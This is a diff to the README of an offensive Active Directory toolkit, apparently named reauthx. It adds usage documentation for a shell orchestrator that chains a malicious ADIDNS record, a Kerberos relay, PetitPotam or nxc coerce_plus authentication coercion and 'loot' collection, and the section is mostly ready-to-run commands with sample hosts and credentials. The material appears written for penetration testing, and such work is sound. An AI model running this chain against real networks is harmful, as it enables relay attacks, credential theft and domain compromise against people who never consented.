@@ -54,6 +54,46 @@ python3 PetitPotam.py -d AD.LOCAL -u user1 -p Passw0rd1 "$NAME" 10.0.0.10
 bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local remove dnsRecord "$NAME" 10.0.0.50
 ```
 
+## Orchestrator
+
+[`reauthx.sh`](reauthx.sh) wraps all five steps behind one CLI. Set the engagement
+parameters once; each sub-command uses only the arguments it needs. It defaults to the
+**shipped** tools — [`dnstool.py`](dnstool.py) for the ADIDNS record and `nxc coerce_plus`
+for coercion — and to the **unicode** name family, which is the one reauthx (Kerberos-only)
+can actually reflect. Secrets are masked in all echoed commands.
+
+```bash
+# dry-run first: print every command (passwords masked), execute nothing
+./reauthx.sh auto -n \
+    -T 10.0.0.10 -H fs01.ad.local -d ad.local \
+    --dc-host dc01.ad.local --dc-ip 10.0.0.5 -R 10.0.0.50 \
+    -u user1 -p Passw0rd1
+
+# the full chain for real: dns-add -> relay (bg) -> coerce -> collect loot -> dns-del.
+# a cleanup trap removes the DNS record and stops the relay even on Ctrl-C / error.
+sudo ./reauthx.sh auto \
+    -T 10.0.0.10 -H fs01.ad.local -d ad.local \
+    --dc-host dc01.ad.local --dc-ip 10.0.0.5 -R 10.0.0.50 \
+    -u user1 -p Passw0rd1
+```
+
+Each step also runs on its own, taking only its arguments:
+
+```bash
+./reauthx.sh check                                  # preflight: deps, scripts, tools, root
+./reauthx.sh name    -H fs01.ad.local               # just print the coercion record
+./reauthx.sh recon   -T 10.0.0.10 -d ad.local -u user1 -p Passw0rd1 \
+                     --probe-user user2 --probe-pass Passw0rd2
+./reauthx.sh dns-add -H fs01.ad.local -d ad.local --dc-host dc01.ad.local -R 10.0.0.50 -u user1 -p Passw0rd1
+./reauthx.sh relay   -T 10.0.0.10 -d ad.local -R 10.0.0.50 -u user1 -p Passw0rd1   # needs sudo
+./reauthx.sh coerce  -T 10.0.0.10 -H fs01.ad.local -d ad.local -u user1 -p Passw0rd1
+./reauthx.sh dns-del -H fs01.ad.local -d ad.local --dc-host dc01.ad.local -u user1 -p Passw0rd1
+```
+
+To mirror the manual flow above instead (external tools), pass `--dns-tool bloodyad`
+and `--coerce-tool petitpotam`. `REAUTHX_PASS` / `REAUTHX_PROBE_PASS` keep passwords off
+the command line; `./reauthx.sh help` lists every option.
+
 ## Credits
 
 - [krbrelayx](https://github.com/dirkjanm/krbrelayx) by [Dirk-jan Mollema](https://github.com/dirkjanm) ; all the heavy lifting is his.
